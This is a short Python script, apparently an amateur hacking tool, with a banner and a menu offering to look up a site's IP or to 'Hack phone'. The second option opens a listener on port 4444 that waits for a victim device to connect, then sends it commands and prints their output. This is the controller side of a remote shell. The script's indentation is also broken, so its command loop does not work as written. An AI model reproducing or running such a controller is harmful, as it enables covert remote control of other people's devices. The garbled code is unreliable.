import socket
import sys

print ("\033[1;31m   ______  _____   _____   _____  ")
print ("   |___  / | ____| /  ___| /  ___/ ")
print ("      / /  | |__   | |     | |___  ")
print ("     / /   |  __|  | |  _  \___  \ ")
print ("    / /__  | |___  | |_| |  ___| | ")
print ("   /_____| |_____| \_____/ /_____/ ")

print("(one)know IP website (two) Hack phone")


t1 = input ('choose waht you want start------>')
if t1== "one" :
 print("let's do that")
 hostname = input()
 ip=socket.gethostbyname(hostname)
 print('Host Name Is:' ,hostname, '\n''target Ip Is: ',ip)
 
else:
    s = socket.socket()
    host=socket.gethostname()
    port=4444
    s.bind((host,port))
 #############
    print ("")
    print (" Server is currently running @ ", host)
    print ("")
    print ("Waiting for any incoming connentions...")
    s.listen(1)
    conn, addr = s.accept()
    print ("")
    print (addr, "Has connected to the server successfully.. ")
 #############
    while 1:
      print ("")
command = input(str("V7X==[Enter Your Command]==>> "))
if command == "v7x":
   conn.send(command.encode())
   print ("")
   print ("Done.. Waiting For Execution...")
   print ("")
   files = conn.recv(5000)
   files = files.decode()
   print ("Done.. Output >> ",files)
elif command == "ls":
  conn.send(command.encode())
  print ("")
  print ("Done.. Waiting For Execution...")
  print ("")
  files = conn.recv(4000)
  files = files.decode()
  print ("Done.. Output >> ",files)
else:
   print ("")
   print ("Err..! [Command Not Found] ")
    
t2 = input("you are Try agine Y Or N")
if t2== "Y" :
 print("Enter host name")
 hostname = input()
 ip=socket.gethostbyname(hostname)
 print('Host Name Is:' ,hostname, '\n''target Ip Is: ',ip)
 
else:
 print ("good bye") 
#############
 